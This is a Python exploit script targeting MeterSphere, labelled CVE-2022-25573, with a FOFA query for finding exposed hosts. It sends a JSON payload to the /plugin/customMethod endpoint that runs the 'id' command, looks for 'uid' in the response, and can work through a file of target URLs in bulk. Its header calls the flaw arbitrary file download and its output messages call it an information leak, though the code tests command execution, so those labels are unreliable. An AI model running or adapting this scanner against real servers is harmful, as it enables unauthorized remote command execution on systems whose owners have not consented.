#!/usr/bin/env python
# -*- conding:utf-8 -*-
# Metersphere file 任意文件下载漏洞 （CVE-2022-25573）
# fofa: app="FIT2CLOUD-MeterSphere"

import requests
import argparse
import sys
import urllib3
import json
urllib3.disable_warnings()


def title():
    print("""
  _____ __      __ ______          ___    ___   ___   ____           ___   _____  _____  ______  ____  
 / ____|\ \    / /|  ____|        |__ \  / _ \ |__ \ |___ \         |__ \ | ____|| ____||____  ||___ \ 
| |      \ \  / / | |__    ______    ) || | | |   ) |  __) | ______    ) || |__  | |__      / /   __) |
| |       \ \/ /  |  __|  |______|  / / | | | |  / /  |__ < |______|  / / |___ \ |___ \    / /   |__ < 
| |____    \  /   | |____          / /_ | |_| | / /_  ___) |         / /_  ___) | ___) |  / /    ___) |
 \_____|    \/    |______|        |____| \___/ |____||____/         |____||____/ |____/  /_/    |____/                                                                                                                                                                                                                                                                                                      

                                                                                        Author:Henry4E36
               """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        payload = self.url + "/plugin/customMethod"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/json"
        }
        proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "https://127.0.0.1:8080",
        }

        data = {"entry":"Evil","request":"id"}
        try:
            res = requests.post(url=payload, headers=headers, data=json.dumps(data), verify=False, timeout=5,proxies=proxies)
            if res.status_code == 200 and "uid" in res.text:
                print(res.text)
                print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 存在敏感信息泄漏漏洞！\033[0m")
                print("[" + "-" * 100 + "]")
            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在敏感信息泄漏漏洞！")
                print("[" + "-" * 100 + "]")
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！")
            print("[" + "-" * 100 + "]")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = ar = argparse.ArgumentParser(description='Metersphere file 任意文件下载漏洞')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 CVE-2022-25573.py -u http://127.0.0.1\neg2:>>>python3 CVE-2022-25573.py -f ip.txt")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()